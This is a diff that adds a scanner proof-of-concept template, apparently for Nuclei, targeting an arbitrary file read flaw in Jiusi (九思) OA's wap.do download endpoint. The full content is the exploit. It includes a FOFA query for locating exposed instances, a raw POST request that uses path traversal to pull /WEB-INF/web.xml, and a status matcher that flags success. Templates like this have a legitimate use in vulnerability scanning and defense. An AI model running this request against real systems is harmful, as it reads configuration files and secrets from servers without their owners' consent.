@@ -1,0 +1,36 @@
+id: poc-uu9znkxnqqrkap1y
+info:
+  name: 九思OA wap 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uu9znkxnqqrkap1y'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uu9znkxnqqrkap1y
+    fofa: body="/jsoa/login.jsp"
+http:
+- raw:
+  - 'POST /jsoa/wap.do?method=downLoad HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 40
+
+
+    path=../&name=&FileName=/WEB-INF/web.xml'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
